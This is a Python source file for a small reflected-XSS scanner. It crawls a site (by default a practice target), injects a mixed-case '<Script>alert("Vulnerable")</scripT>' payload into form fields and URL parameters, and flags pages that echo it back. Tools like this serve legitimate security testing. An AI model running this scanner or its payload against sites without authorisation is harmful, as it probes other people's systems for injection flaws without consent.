import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import sys
import getopt

class Scanner:
    def __init__(self):
        self.argument_list = sys.argv[2:]
        self.target_url = 'http://sudo.co.il/xss/'
        self.session = requests.Session()
        self.pages_crawled = []

        self.options = "hu:"
        self.long_options = ["help","url"]

        try:
            arguments, values = getopt.getopt(self.argument_list, self.options, self.long_options)

            for currentArgument, currentValue in arguments:
                if currentArgument in ("-h","--help"):
                    print("             XSS SCANNER             \n")
                    print("-u or --url      -       to specify the url in this format (http[s]://[domain])")
                    print("-h or --help     -       for this menu")
                    print("\n default url is --> http://sudo.co.il/xss/\n\n")
                    exit()
                
                elif currentArgument in ("-u", "--url"):
                    self.target_url = currentValue
                    self.pages_crawled.append(currentValue)
        except getopt.error as err:
            print(str(err))
            exit()


    def crawler(self, url=None):
        if url is None:
            url = self.target_url
        page = self.session.get(url)
        soup = BeautifulSoup(page.text, 'html.parser')
        links = soup.find_all('a')

        for link in links:
            if 'href' in link.attrs:
                if ':' not in link['href']:
                    new_link = url + link['href']
                    if new_link not in self.pages_crawled:
                        self.pages_crawled.append(new_link)
                        print("[FOUND] "+ new_link)
                        self.crawler(new_link)

    def extract_forms(self, url):
        response = self.session.get(url)

        parsed_html = BeautifulSoup(response.content, features="lxml")
        return parsed_html.findAll("form")

    def submit_form(self, form, value, url):
        action = form.get("action")
        post_url = urljoin(url, action)
        method = form.get("method")

        input_lists = form.findAll("input")
        post_data = {}

        for input in input_lists:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")

            if input_type == "text":
                input_value = value
            
            post_data[input_name] = input_value

        if method == "post":
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def xss_in_form(self, form, url):
        xss_script = "<Script>alert(\"Vulnerable\")</scripT>"
        response = self.submit_form(form, xss_script, url)
        return xss_script in response.text

    def xss_in_link(self, url):
        xss_script = "<Script>alert(\"Vulnerable\")</scripT>"
        url = url.replace("=", "=" + xss_script)
        response = self.session.get(url)
        return xss_script in response.text

    def run(self):
        print("\n\nRunning for URL: %s\n\n" % self.target_url)
        self.crawler()

        for link in self.pages_crawled:
            forms = self.extract_forms(link)
            for form in forms:
                print("\n\n[-->] Testing form in " + link)
                if self.xss_in_form(form, link):
                    print("[YAY] XSS discovered in " + link + " in the following form: ")
                    print(form)

            if "=" in link:
                print("\n\n[-->] Testing " + link)
                if self.xss_in_link(link):
                    print("[YAY] XSS discovered in " + link)

    def __del__(self):
        print("\n[DONE]")
    


